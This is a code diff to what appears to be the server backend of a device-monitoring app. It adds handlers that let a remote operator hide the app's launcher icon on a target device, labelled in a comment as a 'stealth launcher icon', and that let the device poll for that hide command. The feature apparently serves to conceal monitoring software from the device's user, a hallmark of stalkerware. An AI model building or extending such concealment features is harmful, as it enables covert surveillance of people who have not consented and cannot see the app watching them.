@@ -303,3 +303,35 @@ export async function getActivityHandler(req: Request, res: Response, next: Next
   }
 }
 
+// In-memory stealth launcher icon visibility state
+const pendingIconVisibilityCommands = new Map<string, boolean>();
+const deviceIconStateMap = new Map<string, boolean>();
+
+export async function setDeviceIconVisibilityHandler(req: Request, res: Response, next: NextFunction): Promise<void> {
+  try {
+    const { deviceId, hide } = req.body || {};
+    const devId = deviceId || req.params.deviceId;
+    const hideState = Boolean(hide);
+    pendingIconVisibilityCommands.set(devId, hideState);
+    deviceIconStateMap.set(devId, hideState);
+    res.json({ success: true, deviceId: devId, isIconHidden: hideState });
+  } catch (err) {
+    next(err);
+  }
+}
+
+export async function pollDeviceIconVisibilityHandler(req: Request, res: Response, next: NextFunction): Promise<void> {
+  try {
+    const deviceId = req.params.deviceId;
+    const hide = pendingIconVisibilityCommands.get(deviceId);
+    if (hide !== undefined) {
+      pendingIconVisibilityCommands.delete(deviceId);
+    }
+    const currentState = deviceIconStateMap.get(deviceId) || false;
+    res.json({ command: hide !== undefined ? { hide } : null, isIconHidden: currentState });
+  } catch (err) {
+    next(err);
+  }
+}
+
+
